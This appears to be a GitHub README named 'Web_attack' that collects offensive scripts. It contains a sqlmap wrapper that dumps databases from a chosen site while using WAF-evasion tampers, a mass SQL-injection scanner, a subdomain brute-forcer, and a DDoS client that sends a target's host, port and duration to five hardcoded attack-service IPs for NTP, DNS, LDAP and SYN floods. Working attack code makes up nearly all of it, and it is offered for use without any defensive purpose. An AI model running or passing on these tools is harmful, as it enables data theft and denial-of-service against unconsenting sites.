# Web_attack
Web_attack


#### sqlmap automate

```
#!/bin/bash

clear



echo "
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
"

echo
echo -n "[+] Website: " && read site
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=charencode,space2comment,between,modsecurityzeroversioned --dbs --batch
echo
echo -n "[+] DB: " && read db
echo
		
python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned  -D $db --tables
																		 
echo
echo -n "[+] Table: " && read tb
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb --columns

echo
echo -n "[+] Column: " && read cl
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb -C $cl --dump

```
#### FireWave-Mass-Sql-Scan

usage: python FireWave.py domains.txt

Required: requests and colorama

install: pip install requests

install: pip install colorama

```
# coding: utf-8

import sys
import os



os.system("clear||cls")

try:
        import requests
except:
        print ("install requests: pip install requests")
	      						
try:
        from colorama import *

except:
        print ("install colorama: pip install colorama")
				  
print (Style.BRIGHT + Fore.CYAN + '''
 /$$$$$$$$ /$$                     /$$      /$$
| $$_____/|__/                    | $$  /$ | $$
| $$       /$$  /$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$  /$$    /$$ /$$$$$$
| $$$$$   | $$ /$$__  $$ /$$__  $$| $$/$$ $$ $$ |____  $$|  $$  /$$//$$__  $$
| $$__/   | $$| $$  \__/| $$$$$$$$| $$$$_  $$$$  /$$$$$$$ \  $$/$$/| $$$$$$$$
| $$      | $$| $$      | $$_____/| $$$/ \  $$$ /$$__  $$  \  $$$/ | $$_____/
| $$      | $$| $$      |  $$$$$$$| $$/   \  $$|  $$$$$$$   \  $/  |  $$$$$$$
|__/      |__/|__/       \_______/|__/     \__/ \_______/    \_/    \_______/
Usage: FireWave.py <target.txt> \n''' + Fore.RESET + Style.RESET_ALL)

sql = "%5c"
logs = []
webi = open('result.txt','w')
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}

if len(sys.argv) >= 2:
   target = sys.argv[1]
   with open (target) as tag:
       lista = tag.readlines()
       for listy in lista:
           x = listy.rstrip('\n')
           y = sql.rstrip('\n')
           web = x+y
           web = web.strip('\n')
           up = requests.get(web, headers=headers)
           if "mysql_num_rows()" in up.text or "Mysql" in up.text or "Sql syntax" in up.text or "Warning: mysql_fetch_array()" in up.text or "valid MySQL result" in up.text or "MySqlClient." in up.text or "mysql_fetch_assoc()" in up.text or "mysql_fetch_array" in up.text or "session_start()"in up.text or "getimagesize()" in up.text or "is_writable" in up.text or "unknown()" in up.text or "mysql_result()" in up.text or "pg_exec()" in up.text or "mysql_query()" in up.text or  "array_merge" in up.text or "Pregmatch()" in up.text or "filesize()" in up.text or "require()"in up.text or  "You have an error in your SQL syntax" in up.text or  "Warning: mysql" in up.text or "function.mysql" in up.text or "MySQL result index" in up.text or "MySQL Error" in up.text or "MySQL ODBC" in up.text or  "MySQL Driver" in up.text or "mysqli.query" in up.text or "numrows" in up.text or "mysql error:" in up.text or "supplied argument is not a valid MySQL result resource" in up.text or  "on MySQL result index" in up.text or "Error Executing Database Query" in up.text or "mysql" in up.text or "SQL" in up.text:
              print
              print ("[+] Vull SQL: " + Style.BRIGHT + Fore.GREEN + x + Fore.RESET + Style.RESET_ALL)
									
	      logs.append(x+'\n')
           else:
                print 
                print ("[!] Not Vull: " + Style.BRIGHT +  Fore.RED + x + Fore.RESET + Style.RESET_ALL)

webi.writelines(logs)
webi.close()
```
#### DebWave
Enumerador de DNS com WordList, feito em python utilizando Sys e Socket!

Required Socket and Sys

usage: debwave.py target list.txt

remove http and https !

exemple http://www.google.com/ -> google.com
```
import socket
import sys
import os

os.system("clear||cls")

print ("""
                             @@@
                             @@@
                              @@@                       H A P P Y
                              @@@
                      @@@@@@@@@@@@@@@@@@@@@@         H A L L O W E E N
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@
 		   | DNS Enumering BruteForce |
		   |           ./O8           |""")

print
print "Usage: DebWave.py <target> <list.txt> "
print

if len(sys.argv) >= 2:
   target = sys.argv[1]
   lista = sys.argv[2]
   with open (lista) as arquivo:
       brute = arquivo.readlines()
       for btf in brute:
           DNS = btf.rstrip("\n") + "." + target
           try:
               print "[#] DNS: " + DNS + " : "+ socket.gethostbyname(DNS)
           except socket.gaierror:
               pass
```

#### DDOS

```
import os
import time
# Coding by KriptonWave

# Twitter: @KryptonWave1
# Discord: KriptonWave#9010


os.system("clear||cls")


index = (r"""
██████╗ ██╗████████╗██╗ ██████╗ █████╗ 
██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║██║     ███████║
██╔═══╝ ██║   ██║   ██║██║     ██╔══██║
██║     ██║   ██║   ██║╚██████╗██║  ██║
╚═╝     ╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝
""")
 
menu = (r"""[1] NTP      [4] ACK      [7] STROM
[2] DNS      [5] XMASS    [8] COD
[3] LDAP     [6] SSYN""")


headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}
          

try:
    import requests

except:
       print (index)
       print ("[!] Install requests: pip install requests")
       exit()


print (index)
print (menu)

print (" ")
esc = input("Numero da opção desejada: ")
print (" ")
host = input("Target/Host: ")
port = input("Port: ")
time = input("Time: ")

if esc == "1":
   esc = "NTP"

   api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
   ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

   for x in ips:

       atk = ("http://"+x+"/"+api)
       r = requests.get(atk, headers=headers)
              
       if "Attack Launch On" in r.text:
            while True:
               print (f"[+] ATACK INICIADO EM: {host}")
       else:
            print ("[!] ERROR")
            exit()

elif esc == "2":
     esc = "DNS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:

         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
	 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "3":
     esc = "LDAP"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "4":
     esc = "ACK"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()
elif esc == "5":
     esc = "XMASS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk,headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "6":
     esc = "SSYN"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "7":
     esc = "STROM"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]
     
     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "8":
     esc = "COD"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

```
